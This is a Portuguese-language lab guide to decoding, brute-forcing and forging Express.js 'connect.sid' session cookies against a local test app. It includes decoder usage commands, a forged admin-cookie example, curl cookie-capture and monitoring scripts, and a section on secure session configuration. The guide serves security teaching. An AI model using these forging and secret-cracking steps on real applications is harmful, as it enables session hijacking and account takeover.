# Guia Prático: Decodificação de Session Cookies

## 🎯 Objetivo

Demonstrar como decodificar cookies de sessão do Express.js quando a chave secreta é conhecida ou fraca, para fins educativos em segurança web.

## 🔧 Ferramentas Criadas

### 1. **session-decoder.js** (Node.js)
- Decodificação com chave conhecida
- Força bruta automática
- Criação de cookies falsos
- Verificação de assinaturas HMAC-SHA256

### 2. **session-decoder.py** (Python)
- Funcionalidades similares ao script Node.js
- Extração de cookies de requisições HTTP
- Interface de linha de comando amigável

## 📋 Como Obter o Cookie de Sessão

### Método 1: Browser Developer Tools
1. Abra `http://localhost:3000` e faça login
2. Pressione `F12` para abrir Developer Tools
3. Vá para a aba **Application** → **Storage** → **Cookies**
4. Procure por `connect.sid`
5. Copie o valor completo

### Método 2: Interceptação de Requisições
```bash
# Usando curl para capturar headers
curl -c cookies.txt -b cookies.txt -X POST \
  -d "username=admin&password=admin123" \
  http://localhost:3000/login

# Ver cookies salvos
cat cookies.txt
```

### Método 3: Burp Suite / OWASP ZAP
1. Configure proxy no browser
2. Faça login na aplicação
3. Intercepte a requisição
4. Copie o valor do header `Cookie: connect.sid=...`

## 🔍 Exemplos de Uso

### Decodificação Básica (Node.js)
```bash
# Tornar executável
chmod +x session-decoder.js

# Decodificar com chave conhecida
./session-decoder.js "s:eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn19.signature" weak-secret-key

# Força bruta automática
./session-decoder.js "s:eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn19.signature"
```

### Decodificação com Python
```bash
# Força bruta automática
python3 session-decoder.py "s:eyJ1c2VyIjp7ImlkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn19.signature"

# Com chave específica
python3 session-decoder.py "cookie_value" "weak-secret-key"

# Extrair de requisição HTTP
python3 session-decoder.py --extract "Cookie: connect.sid=s:valor.signature"
```

### Criação de Cookie Falso
```bash
# Node.js
./session-decoder.js --create '{"user":{"id":1,"username":"hacker","role":"admin"}}'

# Python
python3 session-decoder.py --create
```

## 🧪 Teste Prático Completo

### Passo 1: Obter Cookie Legítimo
```bash
# Fazer login e capturar cookie
curl -c /tmp/cookies.txt -X POST \
  -d "username=admin&password=admin123" \
  http://localhost:3000/login

# Extrair apenas o cookie de sessão
grep connect.sid /tmp/cookies.txt | cut -f7
```

### Passo 2: Decodificar Cookie
```bash
# Exemplo com cookie real (substitua pelo valor obtido)
COOKIE="s:eyJwYXNzcG9ydCI6e30sInVzZXIiOnsiaWQiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6ImFkbWluMTIzIiwicm9sZSI6ImFkbWluIn19.someSignature"

node session-decoder.js "$COOKIE"
```

### Passo 3: Verificar Resultado
```
📋 DADOS DA SESSÃO DECODIFICADOS:
================================
Chave secreta: weak-secret-key
Dados da sessão:
{
  "passport": {},
  "user": {
    "id": 1,
    "username": "admin",
    "password": "admin123",
    "role": "admin"
  }
}

👤 INFORMAÇÕES DO USUÁRIO:
ID: 1
Username: admin
Role: admin
```

## 🚨 Vulnerabilidades Demonstradas

### 1. **Chave Secreta Fraca**
- **Problema:** `weak-secret-key` é facilmente descoberta
- **Impacto:** Permite decodificação e falsificação de sessões
- **Solução:** Usar chaves criptograficamente seguras (256+ bits)

### 2. **Dados Sensíveis em Cookies**
- **Problema:** Senha em texto plano na sessão
- **Impacto:** Exposição de credenciais
- **Solução:** Armazenar apenas IDs, não dados sensíveis

### 3. **Session Fixation**
- **Problema:** Possível criar cookies válidos
- **Impacto:** Assumir identidade de outros usuários
- **Solução:** Regenerar ID de sessão após login

### 4. **Session Hijacking**
- **Problema:** Cookies não HTTPOnly/Secure
- **Impacto:** Roubo via XSS ou sniffing
- **Solução:** Flags HTTPOnly e Secure

## 🛡️ Medidas de Proteção

### Configuração Segura
```javascript
app.use(session({
    secret: crypto.randomBytes(32).toString('hex'), // Chave forte
    resave: false,
    saveUninitialized: false,
    cookie: { 
        secure: true,      // HTTPS only
        httpOnly: true,    // Não acessível via JS
        maxAge: 1800000,   // 30 minutos
        sameSite: 'strict' // CSRF protection
    },
    name: 'sessionId'      // Nome não óbvio
}));
```

### Armazenamento Seguro
```javascript
// Ao invés de armazenar dados completos
req.session.user = user; // ❌ Perigoso

// Armazenar apenas referência
req.session.userId = user.id; // ✅ Seguro

// Recuperar dados quando necessário
const user = await getUserById(req.session.userId);
```

## 📚 Scripts de Automação

### Extrator Automático de Cookies
```bash
#!/bin/bash
# extract-session.sh

URL="http://localhost:3000"
USERNAME="admin"
PASSWORD="admin123"

# Login e captura de cookie
COOKIE=$(curl -s -c - -X POST \
  -d "username=$USERNAME&password=$PASSWORD" \
  "$URL/login" | grep connect.sid | awk '{print $7}')

if [ ! -z "$COOKIE" ]; then
    echo "Cookie capturado: $COOKIE"
    echo "Decodificando..."
    node session-decoder.js "$COOKIE"
else
    echo "Falha ao capturar cookie"
fi
```

### Monitor de Sessões
```bash
#!/bin/bash
# monitor-sessions.sh

while true; do
    echo "=== $(date) ==="
    
    # Captura novo cookie
    COOKIE=$(./extract-session.sh 2>/dev/null | grep "s:" | head -1)
    
    if [ ! -z "$COOKIE" ]; then
        echo "Novo cookie detectado: $COOKIE"
        python3 session-decoder.py "$COOKIE"
    fi
    
    sleep 30
done
```

## 🎓 Valor Educativo

Este exercício demonstra:

1. **Como funciona a autenticação por sessão**
2. **Importância de chaves secretas fortes**
3. **Riscos de dados sensíveis em cookies**
4. **Técnicas de engenharia reversa de sessões**
5. **Medidas de proteção essenciais**

Use estes scripts apenas em ambientes controlados para aprendizado de segurança web!